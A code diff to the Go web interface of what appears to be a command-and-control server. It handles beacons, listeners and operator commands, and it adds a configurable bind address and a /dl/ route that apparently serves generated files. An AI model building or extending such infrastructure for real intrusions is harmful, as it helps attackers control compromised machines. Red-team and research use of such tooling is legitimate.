@@ -1,16 +1,18 @@
 package main
 
 import (
+	"fmt"
 	"log"
-	"time"
 	"mime"
-	"strconv"
 	"net/http"
+	"strconv"
+	"time"
+
 	"github.com/gorilla/mux"
 )
 
 type IWebInterface interface {
-	startListener() (error)
+	startListener() error
 	beaconsHandler(http.ResponseWriter, *http.Request)
 	listenersHandler(http.ResponseWriter, *http.Request)
 	commandHandler(http.ResponseWriter, *http.Request)
@@ -23,12 +25,13 @@ type IWebInterface interface {
 }
 
 type WebInterface struct {
+	ip   string
 	port int
 }
 
 type WebUpdate struct {
 	Title string
-	Msg string
+	Msg   string
 }
 
 var webInterfaceUpdates []*WebUpdate = make([]*WebUpdate, 0)
@@ -37,7 +40,7 @@ var redirectStdIn bool = false
 var wsWriter http.ResponseWriter
 var hub *Hub
 
-func (server WebInterface) startListener() (error) {
+func (server WebInterface) startListener() error {
 	mime.AddExtensionType(".js", "application/javascript")
 	hub = newHub()
 	go hub.run()
@@ -58,16 +61,23 @@ func (server WebInterface) startListener() (error) {
 	staticFileHandler := http.StripPrefix("/c2/", http.FileServer(staticFileDirectory))
 	router.PathPrefix("/c2/").Handler(staticFileHandler).Methods("GET")
 
+	staticFileDirectoryOut := http.Dir("./out/")
+	staticFileHandlerOut := http.StripPrefix("/dl/", http.FileServer(staticFileDirectoryOut))
+	router.PathPrefix("/dl/").Handler(staticFileHandlerOut).Methods("GET")
+
 	srv := &http.Server{
-        Handler:      router,
-        Addr:         "127.0.0.1:" + strconv.Itoa(server.port),
-        WriteTimeout: 15 * time.Second,
-        ReadTimeout:  15 * time.Second,
-    }
+		Handler:      router,
+		Addr:         server.ip + ":" + strconv.Itoa(server.port),
+		WriteTimeout: 15 * time.Second,
+		ReadTimeout:  15 * time.Second,
+	}
 
 	go func() {
-    	log.Fatal(srv.ListenAndServe())	
+		log.Fatal(srv.ListenAndServe())
+		fmt.Println("Web interface killed")
 	}()
+
+	fmt.Println("Web interface listening on " + server.ip + ":" + strconv.Itoa(server.port))
 
 	return nil
 }
